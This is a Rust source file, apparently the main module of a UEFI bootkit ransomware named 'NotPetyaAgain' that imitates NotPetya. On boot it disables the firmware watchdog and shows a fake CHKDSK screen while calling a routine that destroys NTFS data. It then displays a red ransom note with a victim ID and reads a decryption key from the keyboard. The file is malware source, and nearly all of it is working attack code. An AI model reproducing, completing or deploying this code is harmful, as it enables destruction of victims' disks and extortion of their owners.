#![no_main]
#![no_std]
#![feature(abi_efiapi)]

extern crate alloc;

use alloc::string::String;
use core::fmt::Write;
use core::str;

use log::info;
use uefi::prelude::*;
use uefi::proto::console::text::{Color, Key};
use uefi::table::runtime::ResetType;
use uefi::{Char16, Event};

use crate::efi_vars::read_var;
use crate::ntfs::destroy;
use crate::recover::recover;

mod efi_rng;
mod efi_vars;
mod file;
mod ntfs;
mod recover;

fn init_chdsk_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
    st.stdout().clear()?;
    st.stdout().enable_cursor(false)?;
    st.stdout()
        .write_str(include_str!("include/chdsk_note.txt"))
        .unwrap();

    Ok(())
}

fn init_ransom_screen(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
    st.stdout().clear()?;
    st.stdout().enable_cursor(true)?;
    st.stdout().set_color(Color::Red, Color::Black)?;
    st.stdout()
        .write_str(include_str!("include/ransom_note.txt"))
        .unwrap();
    st.stdout().write_str(id).unwrap();
    st.stdout().write_str("\n\nEnter key here\n> ").unwrap();

    Ok(())
}

fn take_input(
    system_table: &mut SystemTable<Boot>,
    char_16: Char16,
    buffer: &mut String,
    id: &str,
) -> uefi::Result {
    let mut st = unsafe { system_table.unsafe_clone() };
    let stdout = system_table.stdout();
    let char_key = char::from(char_16);
    match char_key {
        // When user press [Enter]
        '\r' => {
            if buffer == "clear" {
                stdout.clear()?;
                init_ransom_screen(&mut st, id)?;
                buffer.clear();
            } else if buffer == "shutdown" {
                system_table.runtime_services().reset(
                    ResetType::Shutdown,
                    Status::SUCCESS,
                    Some(&[]),
                );
            } else {
                recover(&mut st, buffer.as_bytes())?;
                stdout.write_str("\n> ").unwrap();
                buffer.clear();
            }
        }

        // When user press [Backspace]
        '\x08' => {
            if !buffer.is_empty() {
                buffer.pop();
                stdout.write_char(char_key).unwrap();
            }
        }

        // Whatever character
        _ => {
            buffer.push(char_key);
            stdout.write_char(char_key).unwrap();
        }
    }

    Ok(())
}

fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
    boot_services.wait_for_event(events).unwrap();
}

fn shell_land(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
    init_ransom_screen(st, id)?;

    let mut buffer: String = String::from("");
    let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };

    loop {
        wait_for_input(st.boot_services(), &mut key_event);
        if let Some(Key::Printable(key)) = st.stdin().read_key()? {
            take_input(st, key, &mut buffer, id)?;
        }
    }
}

#[entry]
fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut st)?;

    // Disable the 5 min timeout
    st.boot_services().set_watchdog_timer(0, 65536, None)?;

    let mut id_buf = [0u8; 64];
    let id_buf = match read_var(&st, "NotPetyaAgainId", &mut id_buf) {
        Ok(buf) => buf,
        Err(_) => {
            // Print CHDSK message
            init_chdsk_screen(&mut st)?;

            // Speak for it self
            match destroy(&st) {
                Ok(_) => {}
                Err(e) => {
                    info!("{:?}", e);
                    loop {}
                }
            };
            read_var(&st, "NotPetyaAgainId", &mut id_buf).unwrap()
        }
    };

    let id = str::from_utf8(id_buf).unwrap();
    shell_land(&mut st, id)?;

    Status::SUCCESS
}
